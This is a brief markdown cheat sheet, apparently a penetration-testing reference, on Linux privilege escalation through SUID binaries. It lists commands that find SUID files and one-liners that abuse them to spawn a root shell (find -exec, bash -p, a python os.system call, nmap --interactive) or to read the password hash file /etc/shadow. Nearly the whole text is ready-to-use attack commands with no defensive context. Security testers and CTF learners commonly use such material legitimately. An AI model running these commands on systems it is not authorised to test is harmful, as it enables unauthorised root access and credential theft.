# Linux SUID / SGID Exploitation

## Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

## Abusable SUID Binaries
```bash
# If these have SUID set:
./nmap --interactive
./vim /etc/shadow
./find . -exec /bin/sh \; -quit
./bash -p          # -p preserves effective UID
./less /etc/shadow
./python -c 'import os; os.system("/bin/sh")'

# Check the binary owner — if owned by root:
# It runs as root regardless of who launches it
```
